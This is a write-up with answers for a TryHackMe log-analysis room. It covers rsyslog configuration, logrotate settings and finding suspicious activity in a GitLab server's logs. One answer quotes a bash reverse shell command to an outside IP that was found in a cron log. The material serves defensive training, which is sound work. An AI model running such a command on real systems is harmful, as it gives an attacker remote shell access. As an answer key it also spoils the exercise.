
### visit the full project on : https://tryhackme.com/room/introtologs

# Intro
`````
Hey Hisyam,

I figured you'd remote into this web server after the call with SecOps regarding Ticket#2023012398704230, and I wanted to give you some additional context about the unusual activity they reported:

1. This server is our public-facing GitLab server that needs maintenance and upgrading.

2. You could look at the available logs in /var/log/gitlab/, but I suggest looking into /var/log/gitlab/nginx/access.log and searching for suspicious web browser activity first.

3. Unfortunately, this server is not managed frequently, and we have yet to configure the log forwarding to SIEM-02 with rsyslog though it is commented in the config, so you might need to collect the logs manually.

4. You can check the logrotate configuration of this server at /etc/logrotate.d/ and the components of our gitlab instance at /var/opt/gitlab/logrotate/logrotate.d/ if needed.

5. I'm still coordinating with SecOps to get more specific information about the alert they saw, but apparently, there may be someone persistently scanning our GitLab server.

Cheers, and I hope this helps!

- Perry
`````


## Log Collection with rsyslog
1. Ensure rsyslog is installed
```
    sudo systemctl status rsyslog
```
2. Create a Configuration File
```
    gedit /etc/rsyslog.d/98-websrv-02-sshd.conf
    nano /etc/rsyslog.d/98-websrv-02-sshd.conf
```
3. Add the Configuration
    Add the following lines in /etc/rsyslog.d/98-websrv-02-sshd.conf to direct the sshd messages to the specific log file
```
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log

```
4. save and close the conf file
5. restart the syslog ``sudo systemctl restart rsyslog``
6. Verify the Configuration: we can verify the configuration works by initiating an SSH connection to localhost via ``ssh localhost`` or by checking the log file after a minute or two.




## Task Question

1. Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task? <br>
    Combined

2. Based on the list of log types in this task, what log type is used by the log file specified in the note from Task? <br>
    Web Server Log

3. After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing? <br>
    stansimon

4. What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages? <br>
    10.10.10.101


5. Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user? <br>
    /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"

6. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, how many versions of old compressed log file copies will be kept? <br>
    24

7. Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency? <br>
    hourly

8. Upon accessing the log viewer URL for unparsed raw log files, what error does "/var/log/websrv-02/rsyslog_cron.log" show when selecting the different filters? <br>

``http[:]//MACHINE_IP:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
``
access the url and change the filter <br>

answer: <br>
    no date field

9. What is the process of standardising parsed data into a more easily readable and query-able format? <br>

answer: <br>
    Normalisation


10. What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address? <br>

answer: <br>
    Enrichment






